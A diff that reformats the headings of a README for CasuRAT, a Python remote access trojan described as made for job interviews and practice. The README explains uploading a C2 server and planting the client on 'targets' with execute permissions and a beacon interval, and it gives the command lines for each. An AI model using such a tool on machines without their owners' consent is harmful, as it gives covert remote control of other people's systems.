@@ -1,10 +1,10 @@
 # CasuRAT  
-Simple python RAT for job interview and practice.  
+### Simple python RAT for job interview and practice.  
   
 casuRAT and it's partner server are ran entirely off of standard modules. As long as there is a somewhat updated version of python3, all that needs to be done is upload the server.py to a server you control, upload casuRAT.py to targets, ensure they have execute permissions, and run them with the below arguements.  
   
 # Client Usage:  
-python3 ./casuRAT.py <rhost> <rport> <beacon_interval_seconds>  
+### python3 ./casuRAT.py rhost rport beacon_interval_seconds  
   rhost - The IP address of the C2 server  
   rport - Listening port of the C2 server  
   beacon_interval_seconds - The amount of time between attempts to communicate with the C2 server  
@@ -19,7 +19,7 @@ Upon starting casuRAT.py it will make an initial attempt to reach out. Following
 The client should ideally run indefinitely, and is at a decently stable place now.  
   
 # Server Usage  
-python3 ./server.py <lhost> <lport>  
+### python3 ./server.py <lhost> <lport>  
  lhost - Designate the listening IP address  
  lport - Designate the listening port  
    
